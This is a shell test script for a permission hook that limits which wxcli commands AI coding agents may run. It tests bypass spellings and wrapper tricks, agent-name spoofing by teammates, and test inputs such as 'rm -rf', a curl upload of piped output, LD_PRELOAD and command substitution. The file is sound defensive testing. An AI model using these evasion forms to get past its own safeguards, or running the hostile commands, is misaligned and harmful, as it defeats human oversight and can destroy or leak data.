#!/bin/sh
# Decision table for wxcli-gate.sh.
#
# Exists because the gate silently fell open for 14 of 15 invocation spellings:
# it compared `awk '{print $1}'` to the literal string `wxcli`, so any path,
# quote, backslash, wrapper or compound form bypassed it entirely — including
# `/opt/homebrew/bin/wxcli`, the spelling this repo's own audit prompt tells
# subagents to use. A gate that is not tested is a gate nobody knows is off.
#
# Usage:  sh .claude/hooks/wxcli-gate.test.sh
# Exit 0 = all cases as expected.

# Optional argument: run the same decision table against a different copy of the
# gate. Used below to hold the SHIPPED copy (wxcli-dist/wxcli-gate.bundled.sh,
# assembled to src/wxcli/_playbook/.claude/hooks/) to the identical policy. Two
# copies of one policy with nothing comparing them is how they drift apart.
HERE="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
HOOK="${1:-$HERE/wxcli-gate.sh}"

# Second argument selects the gate FAMILY, because the Codex gate is not a
# script and does not speak the same output protocol:
#   shell  $HOOK is a path, invoked as `sh <path>`; permit is a JSON "allow".
#   codex  $HOOK is a COMMAND STRING (the wxcli subcommand .codex/hooks.json
#          wires); permit is SILENCE. Measured on Codex 0.147.0: PreToolUse
#          rejects permissionDecision "allow" as unsupported and falls OPEN, so
#          the only shapes it honours are deny-with-reason and no output.
# Both families are normalised to allow/deny below so ONE table judges both.
# Two gates with nothing comparing them is how they drift apart.
KIND="${2:-shell}"
pass=0; fail=0

# Reads a hook payload on stdin, prints allow|deny|none (or a marker that
# fails). `none` = the gate printed nothing, so Claude Code's normal permission
# rules decide. On Codex silence is also the permit, so there `none` satisfies
# an `allow` row as well (Codex cannot emit `allow`; see check()).
decision() {
  if [ "$KIND" != codex ]; then
    out=$(sh "$HOOK")
    [ -n "$out" ] || { echo none; return; }
    printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision'
    return
  fi
  out=$(eval "$HOOK" 2>/dev/null)
  [ -n "$out" ] || { echo none; return; }
  # Codex refuses a deny carrying an empty reason ("PreToolUse hook returned
  # permissionDecision:deny without a non-empty permissionDecisionReason") and
  # falls OPEN, so a reasonless deny is a FAILURE, not a deny.
  reason=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""')
  [ -n "$reason" ] || { echo deny-without-reason; return; }
  printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // "no-decision"'
}

# The hook payload: agent_type, and agent_id / tool_name only when given (the
# main session's payload has no agent_id; a Bash call carries no MCP tool name).
payload() {
  jq -nc --arg a "$1" --arg c "$2" --arg i "${3:-}" --arg t "${4:-}" \
    '{agent_type:$a,tool_input:{command:$c}}
     + (if $i != "" then {agent_id:$i} else {} end)
     + (if $t != "" then {tool_name:$t} else {} end)'
}

# check <expected> <agent_type> <command> [agent_id] [tool_name]
check() {
  exp=$1; agent=$2; cmd=$3
  got=$(payload "$agent" "$cmd" "${4:-}" "${5:-}" | decision)
  [ "$KIND" = codex ] && [ "$got" = none ] && [ "$exp" = allow ] && got=allow
  if [ "$got" = "$exp" ]; then
    pass=$((pass+1)); printf '  ok   %-6s %s %s\n' "$got" "$cmd" "${5:-}"
  else
    fail=$((fail+1)); printf '  FAIL want=%-5s got=%-5s %s %s\n' "$exp" "$got" "$cmd" "${5:-}"
  fi
}

# check_reason <substring> <agent_type> <command> [agent_id] [tool_name]
# A deny whose reason contains <substring> (case-insensitive).
check_reason() {
  want=$1; shift
  if [ "$KIND" = codex ]; then
    out=$(payload "$@" | eval "$HOOK" 2>/dev/null)
  else
    out=$(payload "$@" | sh "$HOOK")
  fi
  reason=$(printf '%s' "$out" | jq -r 'select(.hookSpecificOutput.permissionDecision == "deny") | .hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
  if printf '%s' "$reason" | grep -qiF -- "$want"; then
    pass=$((pass+1)); printf '  ok   reason~%s  %s %s\n' "$want" "$2" "${4:-}"
  else
    fail=$((fail+1)); printf '  FAIL reason lacks %s  %s %s\n' "$want" "$2" "${4:-}"
  fi
}

echo "== the 15 measured bypass forms (14 must now deny) =="
check allow "" 'wxcli people list'
check deny  "" 'wxcli organizations delete Y2lz'
check deny  "" 'wxcli cleanup run --force'
check deny  "" '/opt/homebrew/bin/wxcli organizations delete Y2lz'
check deny  "" './wxcli cleanup run --force'
check deny  "" 'env wxcli organizations delete Y2lz'
check deny  "" 'bash -c "wxcli organizations delete Y2lz"'
check deny  "" 'sh -c "wxcli cleanup run --force"'
check deny  "" 'cd /tmp && wxcli organizations delete Y2lz'
check deny  "" 'true; wxcli organizations delete Y2lz'
check deny  "" 'echo x | xargs wxcli organizations delete'
check deny  "" '"wxcli" organizations delete Y2lz'
check deny  "" '\wxcli organizations delete Y2lz'
check deny  "" 'command wxcli organizations delete Y2lz'
check deny  "" 'nohup wxcli cleanup run --force'

echo "== reads and help must still allow =="
check allow "" 'wxcli locations list'
check allow "" 'wxcli people show Y2lz'
check allow "" 'wxcli whoami'
check allow "" 'wxcli'
check allow "" 'wxcli --help'
check allow "" 'wxcli --version'
check allow "" 'wxcli people --help'
check allow "" 'wxcli organizations delete --help'
check allow "" 'wxcli cleanup run --help'
check allow "" '/opt/homebrew/bin/wxcli people create -h'
check allow "" '/opt/homebrew/bin/wxcli call-queue list-queues'
check allow "" 'COLUMNS=400 wxcli people list'

echo "== bare group mutates state =="
check deny  "" 'wxcli configure'
check deny  "" 'wxcli switch-org'
check deny  "" 'wxcli clear-org'

# Found 2026-08-10 while porting the gate to Codex. The old rule treated any
# token beginning with a dash as inert, so the FIRST global option became the
# "group" and a real org delete was allowed. Every wxcli global option is a
# boolean flag, so the gate now skips them and judges the command behind them.
echo "== a global option before the group is not a free pass =="
check deny  "" 'wxcli --no-update-check organizations delete Y2lz'
check deny  "" 'wxcli --no-update-check cleanup run --force'
check deny  "" '/opt/homebrew/bin/wxcli --no-update-check locations delete Y2lz'
check deny  "" 'wxcli --no-update-check configure'
check allow "" 'wxcli --no-update-check people list'
check allow "" 'wxcli --no-update-check'
check allow "" 'wxcli --no-update-check people show Y2lz'

echo "== get* is NOT a read (all four issue rest_post) =="
check deny  "" 'wxcli devices get-customer-device Y2lz'
check deny  "" 'wxcli domains get-domain-verification Y2lz'

echo "== trusted agents run unrestricted =="
check allow wxops 'wxcli organizations delete Y2lz'
check allow wxops 'wxcli cleanup run --force'
check allow migration-advisor   '/opt/homebrew/bin/wxcli locations delete Y2lz'

# The exemption is a fixed two-name list, and nothing here asserted that it is
# CLOSED. Found by mutation: widening the case to a third agent left the whole
# table green. An allowlist nobody tests for over-breadth is not an allowlist.
echo "== every other agent gets no exemption =="
check deny  some-other-agent    'wxcli locations delete Y2lz'
check deny  general-purpose     'wxcli cleanup run --force'
check deny  Explore             'wxcli organizations delete Y2lz'
check allow some-other-agent    'wxcli people list'
# Plan 5 renamed the builder to wxops: the old type is now an ordinary caller.
check deny  wxc-calling-builder 'wxcli organizations delete Y2lz'

echo "== the Python import side door stays shut =="
check deny  "" 'python -c "import wxcli"'
check deny  "" 'python3 -c "from wxcli.commands import organizations"'
check deny  "" 'PYTHONPATH=src python -c "import src.wxcli"'

# Plan 5 (open question 1): the gate used to answer `allow` here, which skips
# Claude Code's permission prompt, so `rm -rf` and `git push` ran unasked in
# every folder the gate runs in. Now it says nothing and the normal rules apply.
echo "== unrelated commands are none of our business (no decision) =="
check none  "" 'ls -la'
check none  "" 'git status'
check none  "" 'python tools/drift_check.py --enforce'
check none  "" 'cat wxcli-quality-loop-prompt-v2.md'
check none  "" 'grep -rn wxcli docs/'
check none  "" 'ls docs/superpowers/quality-loop/artifacts/round3'

echo "== compound and nested forms =="
check deny  "" 'wxcli people list && wxcli locations delete Y2lz'
check deny  "" 'wxcli people list || wxcli organizations delete Y2lz'
check deny  "" 'sh -c "cd /tmp && /opt/homebrew/bin/wxcli cleanup run --force"'
check deny  "" 'sudo -u admin wxcli locations delete Y2lz'
check deny  "" 'nice -n 10 env FOO=1 ./wxcli people delete Y2lz'
check allow "" 'wxcli people list && wxcli locations list'
# A read joined to anything that is not wxcli gets no decision: an `allow`
# would approve the other half too. (A pipe into grep head tail jq wc sort
# cut is the exception, P5-19: see the section below.)
check allow "" 'wxcli locations list | jq -r ".[].id"'

# Plan 5 (review S1): the exemption used to `allow` EVERY command a trusted
# agent ran, `git push --force` included. It now covers only wxcli segments.
echo "== the exemption covers wxcli calls only =="
check none  wxops 'git push origin main'
check none  "" 'wxcli people list && rm -rf /tmp/x'
check none  wxops 'wxcli people create X && git push'
check deny  "" 'wxcli people list && wxcli people delete X'
check allow wxops 'wxcli people create X && wxcli people list'
# A second command hidden in a substitution or an assignment is not wxcli.
check none  "" 'wxcli people list $(rm -rf /tmp/x)'
check none  "" 'wxcli people list `rm -rf /tmp/x`'
check none  "" 'wxcli people list; X=$(rm -rf /tmp/y)'
check none  wxops 'wxcli people create X; Y=1'

# Review R1 T4-B1: a lone `&` (run in background) separates two commands, so a
# read joined to a write by one `&` used to be judged as one read and allowed.
# fd duplications (2>&1, >&2) are not separators and must not split.
echo "== a lone & separates commands; fd duplications do not =="
check deny  "" 'wxcli people list & wxcli people delete X'
check none  "" 'wxcli people list & rm -rf /tmp/x'
check none  wxops 'wxcli people list & rm -rf /tmp/x'
check allow wxops 'wxcli people create X & wxcli people list'
check allow "" 'wxcli people list 2>&1'
check allow "" 'wxcli people list >&2'
check allow "" 'wxcli people list 2>&1 | wxcli locations list'
check deny  "" 'wxcli people list 2>&1 & wxcli people delete X'

# Review R1 T4-B2: a write after a shell keyword, behind exec/eval, or inside
# ( ) / { } was not seen as a wxcli call at all.
echo "== shell keywords, exec/eval and grouping do not hide a write =="
check deny  "" 'for i in A B; do wxcli people delete $i; done'
check deny  "" 'if true; then wxcli people delete X; fi'
check deny  "" 'if wxcli people list; then echo ok; else wxcli people delete X; fi'
check deny  "" 'while read i; do wxcli people delete $i; done < ids.txt'
check deny  "" 'until false; do wxcli people delete X; done'
check deny  "" '! wxcli people delete X'
check deny  "" 'exec wxcli people delete X'
check deny  "" 'eval wxcli people delete X'
check deny  "" 'eval "wxcli people delete X"'
check deny  "" '(wxcli people delete X)'
check deny  "" '( wxcli people delete X )'
check deny  "" '{ wxcli people delete X; }'
check allow "" '(wxcli people list)'
check none  "" 'for i in A B; do wxcli people show $i; done'
check allow wxops 'exec wxcli people delete X'

# Review R1 m1: a redirect writes a file, so it never earns an `allow` (the
# prompt decides); a redirect to /dev/null writes nothing.
echo "== a redirect to a file gets no decision =="
check none  "" 'wxcli people list > /tmp/p5-redir'
check none  "" 'wxcli people list >> /tmp/p5-redir'
check none  "" 'wxcli people list &> /tmp/p5-redir'
# `>&word` (word not a number or `-`) is the other spelling of `&>word`: a file
# (P6 final check, Step 4). `>& 2` and `>&-` stay fd operations, so they keep allow.
check none  "" 'wxcli people list >& /tmp/p5-redir'
check none  "" 'wxcli people list >&/tmp/p5-redir'
check allow "" 'wxcli people list >& 2'
check allow "" 'wxcli people list >&-'
check allow "" 'wxcli people list >& /dev/null'
# Review of e8af4d87 (m1): every branch of the `>&` reader. Only one or more
# digits, or a lone `-`, then a word boundary, is an fd operation. Anything else
# is a file (B1), including bash's move form `N-`, which zsh may read as a
# filename: orchestrator ruling, fail-safe, no allow.
check none  "" 'wxcli people list >&2x'
check allow "" 'wxcli people list >&/dev/null'
check allow "" 'wxcli people list >& /dev/null | jq .'
check none  "" 'wxcli people list >&/dev/nullx'
check allow "" 'wxcli people list >& 2 | jq .'
check none  "" 'wxcli people list >&'
check none  "" 'wxcli people list 2>& /tmp/p5-redir'
check none  "" 'wxcli people list >&-5'
check none  "" 'wxcli people list >&--'
check none  "" 'wxcli people list >&2-5'
check none  "" 'wxcli people list >&2-'
check none  "" 'wxcli people list >&-2-'
check none  "" 'wxcli people list >&1--'
check none  wxops 'wxcli people create X > /tmp/p5-out.json'
check allow "" 'wxcli people list 2>/dev/null'
check allow "" 'wxcli people list > /dev/null 2>&1'
check deny  "" 'wxcli people delete X > /tmp/p5-redir'

# P5-19 (Adam, 2026-10-20, tightened): a wxcli call this caller may run, piped
# ONLY into grep head tail jq wc sort cut, is approved. Without it a
# background agent in a customer folder was denied its piped reads. Every
# other pipe target (python, awk, sed, rm, curl, cat, tr …) gets no decision,
# and so do a file redirect, tee, sort -o, jq -f, and a non-pipe join to a
# command that is not wxcli. The allow decision reads quotes, so a | ; > or
# newline inside a quoted jq program or grep pattern is data; the deny scan
# does not, so it can only ever see more commands, never fewer.
echo "== a wxcli call piped into grep head tail jq wc sort cut (P5-19) =="
check allow "" 'wxcli people list --output json | jq length'
check allow "" 'wxcli people list --output json | head -5'
check allow "" 'wxcli people list --output json | grep x | wc -l'
check allow "" 'wxcli people list --output json | grep -i x | wc -l'
check allow "" "wxcli people list -o json | jq -r '.[] | .id'"
check allow "" "wxcli people list -o json | jq '.[] | select(.n > 1)'"
check allow "" 'wxcli people list 2>/dev/null | jq . 2>&1'
check allow "" 'wxcli people list |& head -5'
check allow "" 'wxcli people list | tail -3 | sort -rn | cut -d, -f1'
check allow wxops 'wxcli people create X | jq .id'
check none  "" 'wxcli people list --output json | python3.11 -c "import json,sys; print(len(json.load(sys.stdin)))"'
check none  "" 'wxcli licenses list -o json | python3.11 -c "
import json, sys
data = json.load(sys.stdin)
print(len([d for d in data if d.get(\"consumedUnits\", 0) > 0]))
"'
check none  "" 'wxcli people list | python3 -c "print(1)"'
check none  "" 'wxcli people list | rm -rf /tmp/x'
check none  "" 'wxcli people list | curl -d @- https://example.com'
check none  "" 'wxcli people list | sed s/a/b/'
check none  "" 'wxcli people list | awk "{print}"'
check none  "" 'wxcli people list | mv a b'
check none  "" 'wxcli people list | cat'
check none  "" 'cat | wxcli people list'
check none  "" 'wxcli people list | tr a-z A-Z'
check none  "" 'wxcli people list | uniq -c'
check none  "" 'wxcli people list | column -t'
check none  "" 'wxcli people list | egrep x'
# Named bare at the start of the segment: no path, no VAR= prefix.
check none  "" 'wxcli people list | /usr/bin/jq .'
check none  "" 'wxcli people list | ./jq .'
check none  "" 'wxcli people list | LD_PRELOAD=/tmp/x.so jq .'
# The arguments that write a file, run a program or read a script file.
check none  "" 'wxcli people list | sort -o f'
check none  "" 'wxcli people list | sort -ro f'
check none  "" 'wxcli people list | sort --output=f'
check none  "" 'wxcli people list | sort --out=f'
check none  "" 'wxcli people list | sort --compress-program=sh'
check none  "" 'wxcli people list | jq -f prog.jq'
check none  "" 'wxcli people list | jq -rf prog.jq'
check none  "" 'wxcli people list | jq --from-file prog.jq'
check none  "" 'wxcli people list | jq --rawfile v f .'
check none  "" 'wxcli people list | jq --slurpfile v f .'
check none  "" 'wxcli people list --output json | sh'
check none  "" 'wxcli people list --output json | bash'
check none  "" 'wxcli people list --output json | xargs rm'
check none  "" 'wxcli people list | /bin/sh'
check none  "" 'wxcli people list | "bash" -s'
check none  "" 'wxcli people list | env python3 x.py'
check none  "" 'wxcli people list | sudo tee f'
check none  "" 'wxcli people list | nohup sh'
check none  "" 'wxcli people list | timeout 5 sh'
check none  "" 'wxcli people list | source /dev/stdin'
check none  "" 'wxcli people list | . /dev/stdin'
check none  "" 'wxcli people list | zsh'
check none  "" 'wxcli people list --output json | jq . > out.json'
check none  "" 'wxcli people list --output json | tee f'
check none  "" 'wxcli people list | jq . >> log'
check none  "" 'wxcli people list | jq . &> out'
check none  "" 'wxcli people list | jq . >& out'
check none  "" 'wxcli people list | jq . && rm -rf /tmp/x'
check none  "" 'wxcli people list | jq . || ls'
check none  "" 'wxcli people list | jq . ; ls'
check none  "" 'wxcli people list | jq . &'
check none  "" 'wxcli people list | jq .
ls'
check none  "" 'wxcli people list | jq "$(cat x)"'
check none  "" 'wxcli people list | grep "`cat x`"'
check none  "" 'wxcli people list | diff - <(ls)'
# A comment hides nothing from the shell but can fool a quote reader: an
# unquoted # gets no allow. So does an unterminated quote.
check none  "" "wxcli people list | jq . # it's
rm -rf /tmp/x #'"
check none  "" "wxcli people list | jq '.x"
check none  "" 'cat secrets.txt | python3 -c "print(1)"'
# Writes piped into anything are still refused (every family, Codex included).
check deny  "" 'wxcli people delete X | python3 -c "print(1)"'
check deny  "" 'wxcli people delete X | jq .'
check allow wxops 'wxcli people delete X | jq .'
check none  wxops 'wxcli people delete X | python3 -c "print(1)"'
check deny  "" 'wxcli people delete X | head -5'
check deny  "" '/opt/homebrew/bin/wxcli people delete X | jq .'
check deny  "" 'wxcli people list | python3 -c "print(1)" | wxcli people delete X'
check deny  "" 'cat | wxcli people delete X'
check deny  general-purpose 'wxcli people delete X | jq .' a1
check_reason 'do not spawn' general-purpose 'wxcli people delete X | jq .' a1

# Found in Task 6: a wrapper followed by ANY program and a trailing wxcli
# token was approved (`env rm -rf X wxcli`), because the wrapper scan takes the
# first wxcli token anywhere. A wrapper now counts as a wxcli call for an
# allow only when what follows it is options, numbers, VAR=val or other
# wrappers up to wxcli. The deny scan is unchanged.
echo "== a wrapper approves only wxcli itself =="
check none  "" 'env rm -rf /tmp/p5x wxcli'
check none  "" 'nice rm -rf /tmp/p5x wxcli'
check none  "" 'wxcli people list | xargs rm -rf wxcli'
check none  "" 'sh -c "rm -rf /tmp/p5x" wxcli'
check none  "" 'env rm -rf /tmp/p5x wxcli people list'
check none  wxops 'env rm -rf /tmp/p5x wxcli people create X'
check deny  "" 'env rm -rf /tmp/p5x wxcli people delete X'
check allow "" 'env FOO=1 wxcli people list'
check allow "" 'nice -n 10 wxcli people list'
check allow "" 'time wxcli people list | jq length'
# An option VALUE (admin) is not an option: no allow, the prompt decides.
check none  "" 'sudo -u admin wxcli people list'

# A deny inside a subagent (agent_id present) must not send it off to spawn
# another agent: the 2026-07-31 failure was a denied agent spawning builders.
echo "== the deny text depends on who is asking =="
check_reason 'do not spawn' general-purpose 'wxcli people delete X' a1
check_reason 'do not spawn' "" 'wxcli people delete X' a1
check_reason 'Only read-only wxcli' "" 'wxcli people delete X'
if [ "$KIND" = codex ]; then
  check_reason 'agent_type' "" 'wxcli people delete X'
  check_reason 'underscores' "" 'wxcli people delete X'
else
  check_reason 'subagent_type' "" 'wxcli people delete X'
  check_reason 'not its name' "" 'wxcli people delete X'
fi

# Plan 5 (P5-17): with agent teams on, a NAMED spawn becomes an in-process
# teammate whose hook agent_type is its spawn name, so a general-purpose
# teammate named like the builder passed as the builder (measured, interactive,
# Claude Code 2.1.304). The gate refuses any caller it can tell is a teammate;
# the signals only ever deny. Teammate ids look like a<name>-<16 hex>; ordinary
# subagent ids are a<17 hex>. Claude Code only: Codex has no teammates.
if [ "$KIND" != codex ]; then
  echo "== agent-team teammates are refused, never exempted =="
  check deny  wxops 'wxcli people delete X' awxops-0123456789abcdef
  check_reason 'agent teams are on' wxops 'wxcli people delete X' awxops-0123456789abcdef
  check_reason 'do not spawn' wxops 'wxcli people delete X' awxops-0123456789abcdef
  check deny  general-purpose     'wxcli people delete X' ageneral-purpose-0123456789abcdef
  check_reason 'agent teams are on' general-purpose 'wxcli people delete X' ageneral-purpose-0123456789abcdef
  check allow wxops 'wxcli people list'     awxops-0123456789abcdef
  check allow wxops 'wxcli people delete X' a0123456789abcdef0
  check allow migration-advisor   'wxcli people delete X' a5c80b9d0123456789
fi

# Plan 5 (open question 2): the Flow Store MCP server's writes run only inside
# the builder. Read tools pass with no decision; any other tool of that server
# is refused, unknown ones included (fail closed). Shell family only: the Codex
# hooks.json wires ^Bash$ alone, so Codex MCP calls are not gated (recorded gap).
if [ "$KIND" != codex ]; then
  echo "== Flow Store MCP writes run only inside the builder =="
  for t in create_flow save_flow_draft patch_flow_draft some_new_tool; do
    check deny "" "" "" "mcp__wxcc-flow-builder__$t"
  done
  for t in list_flows get_flow validate_flow get_flow_template get_activity_definitions \
           get_activity_node_schema describe_activity get_choices list_event_specifications; do
    check none "" "" "" "mcp__wxcc-flow-builder__$t"
  done
  check_reason create_flow "" "" "" mcp__wxcc-flow-builder__create_flow
  check_reason 'do not spawn' general-purpose "" a1 mcp__wxcc-flow-builder__save_flow_draft
  check allow wxops "" "" mcp__wxcc-flow-builder__create_flow
  check allow migration-advisor   "" a1 mcp__wxcc-flow-builder__patch_flow_draft
  check deny  general-purpose     "" a1 mcp__wxcc-flow-builder__create_flow
  check deny  wxops "" awxops-0123456789abcdef mcp__wxcc-flow-builder__create_flow
fi

echo
echo "pass=$pass fail=$fail"
[ "$fail" -eq 0 ] || exit 1

# Same table, shipped copy. Only when invoked with no argument, so the recursive
# call terminates. The bundled source is authoritative; the assembled copy under
# _playbook/ is regenerated output and may legitimately be absent in a tree that
# has not run assemble.py, so a missing one is skipped, not failed.
if [ -z "${1:-}" ]; then
  for shipped in "$HERE/../../wxcli-dist/wxcli-gate.bundled.sh" \
                 "$HERE/../../src/wxcli/_playbook/.claude/hooks/wxcli-gate.sh"; do
    [ -f "$shipped" ] || continue
    echo
    echo "== same table, shipped copy: ${shipped##*/../} =="
    sh "$0" "$shipped" || exit 1
  done

  # Same table, CODEX gate. It is a wxcli subcommand rather than a script,
  # because Codex hands a hook no project-dir variable and FAILS OPEN when a
  # hook cannot execute — an unresolved script path there is a silent no-gate,
  # so resolution is a safety property and PATH lookup of the installed binary
  # is the one form that has no path to get wrong.
  echo
  if command -v wxcli >/dev/null 2>&1; then
    echo "== same table, Codex gate: wxcli codex-gate =="
    sh "$0" "wxcli --no-update-check codex-gate" codex || exit 1
  else
    echo "== Codex gate NOT EXERCISED: wxcli is not on PATH =="
    echo "The shell gates passed; the Codex gate was not tested. Install wxcli"
    echo "(pip install -e .) and re-run before trusting this result."
    exit 1
  fi
fi
